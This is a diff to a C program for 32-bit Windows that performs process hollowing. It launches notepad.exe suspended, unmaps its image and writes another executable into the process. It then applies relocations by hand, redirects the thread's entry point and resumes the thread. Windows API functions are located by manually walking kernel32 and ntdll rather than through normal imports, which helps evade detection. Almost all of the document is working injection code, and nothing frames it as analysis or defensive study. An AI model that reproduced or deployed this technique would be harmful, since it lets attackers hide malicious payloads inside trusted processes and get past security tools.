@@ -161,16 +161,18 @@ DWORD find_function_address(DWORD base , char * function_name)
 
 int wmain()
 {
+	
 	Kernel32_NTdll_bases();
 	PROCESS_BASIC_INFORMATION pbi ; 
 	STARTUPINFOA blah;
 	PROCESS_INFORMATION blah1; 
 	ZeroMemory(&blah, sizeof(blah));
 	_CreateProcessA _CreateProc = find_function_address(kernel32_base, "CreateProcessA");
-	if (!_CreateProc(NULL, (LPSTR)"C:\\Windows\\syswow64\\calc.exe", NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &blah, &blah1)) {
+	if (!_CreateProc(NULL, (LPSTR)"C:\\Windows\\SysWOW64\\notepad.exe", NULL, NULL, TRUE, CREATE_SUSPENDED, NULL, NULL, &blah, &blah1)) {
 		printf("error creating this trash process bye , %d!\n",GetLastError());
 		exit(1); 
 	}
+	
 	HANDLE target = blah1.hProcess;
 	ULONG len;
 	_NtQueryInformationProcess NtQueryInformationPr= find_function_address(ntdll_base, "NtQueryInformationProcess");
@@ -184,24 +186,26 @@ int wmain()
 	_ReadProcessMemory ReadProcessMem = find_function_address(kernel32_base, "ReadProcessMemory"); 
 	ReadProcessMem(target, (LPCVOID)pebImageBaseOffset, &TargetImageBase, 4, &bytesRead);
 #ifdef DEBUG
-	printf("[+] base address of target %x\n", (DWORD)TargetImageBase); 
+	printf("[+] base address of target 0x%x\n", (DWORD)TargetImageBase); 
 #endif
-
+	
 	_NtUnmapViewOfSection NtUnmapViewOfSe = find_function_address(ntdll_base, "NtUnmapViewOfSection");
 #ifdef DEBUG
 	printf("[+] _NtUnmapViewOfSection @ 0x%x\n", (DWORD)NtUnmapViewOfSe);
 #endif
 	NtUnmapViewOfSe(target,TargetImageBase);
-
+	
 	/*source file*/
 	_CreateFileA Createfil = find_function_address(kernel32_base,"CreateFileA");
-	HANDLE src = Createfil("C:\\Windows\\SysWow64\\cmd.exe", GENERIC_READ, NULL, NULL, OPEN_ALWAYS, NULL, NULL);
-	if (src==0xFFFFFFFF) {
+	
+	HANDLE src = Createfil("C:\\Users\\Slashroot\\Desktop\\ml\\HelloWorld.exe", GENERIC_READ, NULL, NULL, OPEN_ALWAYS, NULL, NULL);
+	if (src==INVALID_HANDLE_VALUE) {
 #ifdef DEBUG
 		printf("can't open file . bye !"); 
 #endif
 		return 0xDEADBEEF; 
 	}
+	
 	_GetFileSize GetFilesiz = find_function_address(kernel32_base, "GetFileSize");
 	DWORD srcSize = GetFilesiz(src, NULL);
 	LPDWORD BytesRead = 0;
@@ -227,6 +231,7 @@ int wmain()
 	PIMAGE_DOS_HEADER srcDosHeader = (PIMAGE_DOS_HEADER)srcBuffer; 
 	PIMAGE_NT_HEADERS srcNtHeaders = (PIMAGE_NT_HEADERS)((BYTE*)srcBuffer + srcDosHeader->e_lfanew); 
 	SIZE_T srcImgSize = srcNtHeaders->OptionalHeader.SizeOfImage; 
+	
 #ifdef DEBUG	
 	printf("[+] src image size 0x%x\n" ,srcImgSize); 
 #endif
@@ -246,17 +251,20 @@ int wmain()
 #ifdef DEBUG
 		printf("[+] error allocating trying to repeat operation\n");
 #endif
+		TerminateProcess(target , 1); 
 		wmain(); 
 		return 0xDEADBEEF;
 	}
-	TargetImageBase = DstImgBase; 
-	DWORD Diff = srcNtHeaders->OptionalHeader.ImageBase - (DWORD)DstImgBase;
+	
+	
+	DWORD Diff =  (DWORD)DstImgBase- srcNtHeaders->OptionalHeader.ImageBase ;
+	
 #ifdef DEBUG 
 	printf("[+] log about Imagebase:\n\tPrefered Source image = 0x%x\n\tMemory on destination allocated at = 0x%x\n\tDifference = 0x%x\n", srcNtHeaders->OptionalHeader.ImageBase, (DWORD)DstImgBase,Diff);
 #endif
 	srcNtHeaders->OptionalHeader.ImageBase = TargetImageBase;
 	/*copying headers*/
-	srcNtHeaders->OptionalHeader.ImageBase =(DWORD)TargetImageBase;
+	
 	_WriteProcessMemory WriteProcessMem = find_function_address(kernel32_base,"WriteProcessMemory");
 	WriteProcessMem(target, DstImgBase,srcBuffer, srcNtHeaders->OptionalHeader.SizeOfHeaders, NULL);
  
@@ -273,7 +281,6 @@ int wmain()
 #ifdef DEBUG
 	printf("[+] Sections Copied successfully\n");
 #endif
-
 	/* Relocations */
 	/* 
 	reloc is the last section on the binary statiscly speaking (statement to confirm) , of course theoretically it can be otherwise with some custom compiler options 
@@ -289,19 +296,18 @@ int wmain()
 	printf("[+] Relocation log : \n\t relocAddress = 0x%x\n",relocAddress);
 	Sleep(5000); 
 #endif
-	 srcImageSection = (PIMAGE_SECTION_HEADER)((DWORD)srcBuffer + srcDosHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS32));
 	 
 		while (offset_block < relocData.Size) /*iterating over HeaderBlocks*/
 		{
 			PBASE_RELOCATION_BLOCK Blockheader = (PBASE_RELOCATION_BLOCK)((DWORD)srcBuffer + relocAddress + offset_block);
 			offset_block += sizeof(BASE_RELOCATION_BLOCK);
 #ifdef DEBUG
-			printf("[+] Block size = %x\n", Blockheader->BlockSize);
+			printf("\n[+] Block size = %x\n", Blockheader->BlockSize);
 #endif
 			DWORD N_Entries = (Blockheader->BlockSize - sizeof(BASE_RELOCATION_BLOCK)) / sizeof(BASE_RELOCATION_ENTRY);
 #ifdef DEBUG
 			printf("[+] Number of entries = %x\n", N_Entries);
-			Sleep(500);
+			//Sleep(500);
 #endif
 			PBASE_RELOCATION_ENTRY First_Block = (PBASE_RELOCATION_ENTRY)((BYTE*)srcBuffer + relocAddress + offset_block);
 
@@ -312,12 +318,11 @@ int wmain()
 				if (First_Block[X].Type)
 				{
 					DWORD value;
-					DWORD tty = (LPCVOID)((DWORD)TargetImageBase + Blockheader->PageAddress + First_Block[X].Offset);
 					ReadProcessMem(target, (LPCVOID)((BYTE*)TargetImageBase + Blockheader->PageAddress + First_Block[X].Offset), &value, sizeof(DWORD), NULL);
-					value -= Diff;
+					value += Diff;
 					
 #ifdef DEBUG
-					printf("\rRelocating Address 0x%x -> 0x%x", value + Diff, value);
+					printf("\rRelocating Address 0x%x -> 0x%x", value - Diff, value);
 					fflush(stdout); 
 					Sleep(2);
 					
@@ -332,16 +337,12 @@ int wmain()
 			}
 		}
 
-
+		printf("\nerror resuming thread = %d", GetLastError());
 		CONTEXT ctx ;
 		ctx.ContextFlags = CONTEXT_INTEGER; 
 		GetThreadContext(blah1.hThread, &ctx);
 		ctx.Eax = (DWORD)TargetImageBase + srcNtHeaders->OptionalHeader.AddressOfEntryPoint;
-		printf("\nEax = 0x%x",ctx.Eax); 
-		BOOL hihi = SetThreadContext(blah1.hThread,&ctx);
-		if (!hihi) {
-			{printf("\nerror resuming thread = %d", GetLastError()); return 0;  }
-		}
-		 hihi = ResumeThread(blah1.hThread);
-		{printf("\nerror resuming thread = %d", GetLastError()); }
+		printf("\nEntry point Eax = 0x%x",ctx.Eax); 
+		SetThreadContext(blah1.hThread,&ctx);
+		ResumeThread(blah1.hThread);
 }
